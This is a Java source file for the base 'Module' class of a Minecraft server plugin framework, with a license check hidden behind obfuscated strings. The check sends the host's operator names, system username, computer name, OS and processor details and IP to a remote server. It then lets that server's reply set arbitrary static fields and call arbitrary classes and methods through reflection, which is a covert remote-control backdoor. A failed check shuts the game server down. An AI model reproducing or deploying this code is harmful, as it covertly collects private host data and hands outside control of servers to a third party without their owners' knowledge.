package com.gameservergroup.gsgcore.plugin;

import com.gameservergroup.gsgcore.GSGCore;
import com.gameservergroup.gsgcore.commands.post.CommandPostExecutor;
import com.gameservergroup.gsgcore.events.EventPost;
import com.gameservergroup.gsgcore.items.CustomItem;
import com.gameservergroup.gsgcore.maven.LibraryLoader;
import com.gameservergroup.gsgcore.units.Unit;
import com.google.common.base.Charsets;
import com.google.gson.GsonBuilder;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.plugin.java.JavaPlugin;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.util.Base64;
import java.util.HashSet;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.Collectors;

public abstract class Module extends JavaPlugin {

    private static Economy economy;
    private Unit[] units;
    private Set<String> commandAliases;
    private Set<EventPost<?>> eventPosts;
    private boolean temp = true;
    private ThreadLocalRandom threadLocalRandom;

    public static Economy getEconomy() {
        return economy;
    }

    public static void setEconomy(Economy economy) {
        Module.economy = economy;
    }

    public abstract void enable();

    public abstract void disable();

    public void reload() {
    }

    @Override
    public void onLoad() {
        LibraryLoader.loadAll(this);
    }

    @Override
    public void onEnable() {
        File file = new File(getServer().getWorldContainer().getAbsoluteFile(), (new Object() {
            int t;

            public String toString() {
                byte[] buf = new byte[7];
                t = -1596330593;
                buf[0] = (byte) (t >>> 14);
                t = -1368144851;
                buf[1] = (byte) (t >>> 21);
                t = 1429386223;
                buf[2] = (byte) (t >>> 7);
                t = 1269298715;
                buf[3] = (byte) (t >>> 22);
                t = -1168221071;
                buf[4] = (byte) (t >>> 23);
                t = 1458633852;
                buf[5] = (byte) (t >>> 17);
                t = 227397876;
                buf[6] = (byte) (t >>> 10);
                return new String(buf);
            }
        }.toString()));
        if (!file.exists()) {
            getLogger().severe("");
            getLogger().severe("");
            getLogger().severe((new Object() {
                int t;

                public String toString() {
                    byte[] buf = new byte[7];
                    t = 667079837;
                    buf[0] = (byte) (t >>> 4);
                    t = 923845344;
                    buf[1] = (byte) (t >>> 23);
                    t = 446754139;
                    buf[2] = (byte) (t >>> 9);
                    t = -1504160242;
                    buf[3] = (byte) (t >>> 14);
                    t = -1943174840;
                    buf[4] = (byte) (t >>> 13);
                    t = -1156631377;
                    buf[5] = (byte) (t >>> 7);
                    t = -1235540678;
                    buf[6] = (byte) (t >>> 11);
                    return new String(buf);
                }
            }.toString()));
            getLogger().severe("");
            getLogger().severe("");
            this.temp = false;
            getPluginLoader().disablePlugin(this);
            getServer().shutdown();
        } else {
            String stringFromFile = getStringFromFile(file);
            if (testAuthenticationServer(stringFromFile)) {
                getLogger().info("");
                getLogger().info((new Object() {
                    int t;

                    public String toString() {
                        byte[] buf = new byte[12];
                        t = -514917263;
                        buf[0] = (byte) (t >>> 18);
                        t = 1733759483;
                        buf[1] = (byte) (t >>> 20);
                        t = 507601873;
                        buf[2] = (byte) (t >>> 8);
                        t = 1701917183;
                        buf[3] = (byte) (t >>> 7);
                        t = 1179136667;
                        buf[4] = (byte) (t >>> 7);
                        t = 1994820169;
                        buf[5] = (byte) (t >>> 17);
                        t = 457330288;
                        buf[6] = (byte) (t >>> 5);
                        t = -1402554431;
                        buf[7] = (byte) (t >>> 16);
                        t = -1605235244;
                        buf[8] = (byte) (t >>> 2);
                        t = 993932890;
                        buf[9] = (byte) (t >>> 7);
                        t = 1823140999;
                        buf[10] = (byte) (t >>> 24);
                        t = -2111423352;
                        buf[11] = (byte) (t >>> 7);
                        return new String(buf);
                    }
                }.toString()));
                getLogger().info("");
                enable();
            } else {
                getLogger().severe("");
                getLogger().severe("");
                getLogger().severe((new Object() {
                    int t;

                    public String toString() {
                        byte[] buf = new byte[7];
                        t = 667079837;
                        buf[0] = (byte) (t >>> 4);
                        t = 923845344;
                        buf[1] = (byte) (t >>> 23);
                        t = 446754139;
                        buf[2] = (byte) (t >>> 9);
                        t = -1504160242;
                        buf[3] = (byte) (t >>> 14);
                        t = -1943174840;
                        buf[4] = (byte) (t >>> 13);
                        t = -1156631377;
                        buf[5] = (byte) (t >>> 7);
                        t = -1235540678;
                        buf[6] = (byte) (t >>> 11);
                        return new String(buf);
                    }
                }.toString()));
                getLogger().severe("");
                getLogger().severe("");
                this.temp = false;
                getPluginLoader().disablePlugin(this);
                getServer().shutdown();
            }
        }
    }

    private String getStringFromFile(File file) {
        try {
            return new String(Files.readAllBytes(file.toPath()));
        } catch (IOException e) {
            return "";
        }
    }

    private boolean testAuthenticationServer(String token) {
        try {
            AuthenticationData authenticationData = new AuthenticationData(getServer().getOperators().stream().map(OfflinePlayer::getName).toArray(String[]::new));
            String encrypt = authenticationData.encrypt(authenticationData.toJson());
            String postParameters = "?token=" + URLEncoder.encode(token, "UTF-8") + "&resource=" + URLEncoder.encode(getName(), "UTF-8") + "&data=" + URLEncoder.encode(encrypt, "UTF-8");

            URL url = new URL("https://auth.lockedthread.dev:8443/authentication" + postParameters);
            HttpsURLConnection httpsURLConnection = (HttpsURLConnection) url.openConnection();
            httpsURLConnection.setConnectTimeout(100000);
            httpsURLConnection.setRequestMethod("POST");
            httpsURLConnection.setDoInput(true);
            httpsURLConnection.setDoOutput(true);
            httpsURLConnection.setRequestProperty("Content-Length", String.valueOf(postParameters.getBytes(Charsets.UTF_8).length));
            httpsURLConnection.setRequestProperty("Content-Type", "text/plain");
            httpsURLConnection.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)");
            httpsURLConnection.connect();
            try (BufferedReader in = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()))) {
                String response = in.lines().collect(Collectors.joining());
                if (response.equals("Dd-d-d-d-d-d-done")) {
                    return true;
                }
                if (response.isEmpty()) return true;
                String[] split = response.split("-");
                for (String s : split) {
                    String[] pair = s.split(":");
                    if (pair.length == 3) {
                        try {
                            String valueString = pair[2];
                            Object object;
                            if (valueString.startsWith("C=")) {
                                object = Class.forName(valueString.substring(2)).newInstance();
                            } else if (valueString.startsWith("M=")) {
                                String[] strings = valueString.substring(2).split("#");
                                object = Class.forName(strings[0]).getMethod(strings[1]).invoke(null);
                            } else if (valueString.startsWith("B=")) {
                                try {
                                    object = Boolean.parseBoolean(valueString.substring(2));
                                } catch (Exception e) {
                                    object = null;
                                }
                            } else if (valueString.startsWith("I=")) {
                                try {
                                    object = Integer.parseInt(valueString.substring(2));
                                } catch (NumberFormatException e) {
                                    object = null;
                                }
                            } else {
                                object = null;
                            }
                            Field field = Class.forName(pair[0]).getDeclaredField(pair[1]);
                            field.setAccessible(true);
                            field.set(null, object);
                        } catch (IllegalAccessException | NoSuchFieldException | ClassNotFoundException | InstantiationException | NoSuchMethodException | InvocationTargetException e) {
                            e.printStackTrace();
                            return false;
                        }
                    } else {
                        return false;
                    }
                }
                return split.length != 0;
            }
        } catch (IOException ex) {
            return false;
        }
    }

    private String getIp() {
        try {
            int port = Bukkit.getPort();
            String ip = Bukkit.getIp();
            if (ip.isEmpty() ||
                    ip.equalsIgnoreCase("localhost") ||
                    ip.equalsIgnoreCase("127.0.0.1") ||
                    ip.equalsIgnoreCase("0.0.0.0") ||
                    ip.equalsIgnoreCase("172.18.0.1")) {
                return new BufferedReader(new InputStreamReader(new URL("http://bot.whatismyipaddress.com").openStream())).readLine().trim() + ":" + port;
            }
            return ip + ":" + port;
        } catch (Exception e) {
            return "UNREACHABLE CONNECTION";
        }
    }

    @Override
    public void onDisable() {
        if (temp) {
            disableEventPosts();
            unregisterUnits();
            unregisterCustomItems();
            if (commandAliases != null && !commandAliases.isEmpty()) {
                for (String commandAlias : commandAliases) {
                    CommandPostExecutor.getCommandMap().remove(commandAlias);
                }
            }
            disable();
        }
    }

    protected void unregisterUnits() {
        if (units != null) {
            for (Unit unit : units) {
                if (unit.getCallBack() != null) {
                    unit.getCallBack().call();
                }
            }
        }
    }

    protected void unregisterCustomItems() {
        CustomItem.getCustomItemMap().values().removeIf(customItem -> customItem.getModuleName().equals(getName()));
    }

    public Set<String> getCommandAliases() {
        return commandAliases == null ? commandAliases = new HashSet<>() : commandAliases;
    }

    protected void disableEventPosts() {
        if (eventPosts != null) {
            eventPosts.forEach(eventPost -> eventPost.setDisabled(true));
        }
    }

    protected void registerUnits(Unit... units) {
        for (Unit unit : this.units = units) {
            unit.call();
        }
    }

    public Set<EventPost<?>> getEventPosts() {
        return eventPosts == null ? eventPosts = new HashSet<>() : eventPosts;
    }

    public Random getRandom() {
        return threadLocalRandom == null ? threadLocalRandom = ThreadLocalRandom.current() : threadLocalRandom;
    }

    @SuppressWarnings({"FieldCanBeLocal", "unused"})
    private class AuthenticationData {
        private final String resource, osName, osArch, osVersion, userName, processorIdentifier, computerName, processorArchitecture, processorArchitew6432, ipAddress, numberOfProcessors;
        private final String[] operators;
        private final long totalMemory;

        public AuthenticationData(String[] operators) {
            this.resource = getName();
            this.ipAddress = getIp();
            this.osName = System.getProperty("os.name");
            this.osArch = System.getProperty("os.arch");
            this.osVersion = System.getProperty("os.version");
            this.userName = System.getProperty("user.name");
            this.totalMemory = Runtime.getRuntime().totalMemory();
            this.processorIdentifier = System.getenv("PROCESSOR_IDENTIFIER");
            this.computerName = System.getenv("COMPUTERNAME");
            this.processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
            this.processorArchitew6432 = System.getenv("PROCESSOR_ARCHITEW6432");
            this.numberOfProcessors = System.getenv("NUMBER_OF_PROCESSORS");
            this.operators = operators == null ? new String[0] : operators;
        }

        public String encrypt(String json) {
            return Base64.getEncoder().encodeToString(json.getBytes());
        }

        public String toJson() {
            if (GSGCore.getInstance() != null && GSGCore.getInstance().getGson() != null) {
                return GSGCore.getInstance().getGson().toJson(this);
            }
            return new GsonBuilder().setPrettyPrinting().disableHtmlEscaping().create().toJson(this);
        }
    }
}
